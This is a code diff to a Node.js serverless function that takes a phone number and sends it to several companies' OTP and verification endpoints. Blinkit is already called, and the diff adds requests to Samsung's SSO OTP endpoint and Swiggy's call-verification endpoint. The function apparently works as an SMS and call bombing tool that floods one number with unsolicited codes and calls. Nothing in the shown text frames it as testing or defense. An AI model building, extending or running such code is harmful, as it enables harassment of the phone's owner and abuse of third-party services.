@@ -1,7 +1,6 @@
 const fetch = require("node-fetch");
 
 exports.handler = async (event) => {
-  // Support both GET and POST
   const method = event.httpMethod;
   let phone;
 
@@ -54,6 +53,30 @@ exports.handler = async (event) => {
     results.push({ blinkit: blinkit.status });
   } catch (err) {
     results.push({ blinkit: "error" });
+  }
+
+  // 4. Samsung
+  try {
+    const samsung = await fetch("https://www.samsung.com/in/api/v1/sso/otp/init", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ user_id: phone }),
+    });
+    results.push({ samsung: samsung.status });
+  } catch (err) {
+    results.push({ samsung: "error" });
+  }
+
+  // 5. Swiggy
+  try {
+    const swiggy = await fetch("https://profile.swiggy.com/api/v3/app/request_call_verification", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ mobile: phone }),
+    });
+    results.push({ swiggy: swiggy.status });
+  } catch (err) {
+    results.push({ swiggy: "error" });
   }
 
   return {
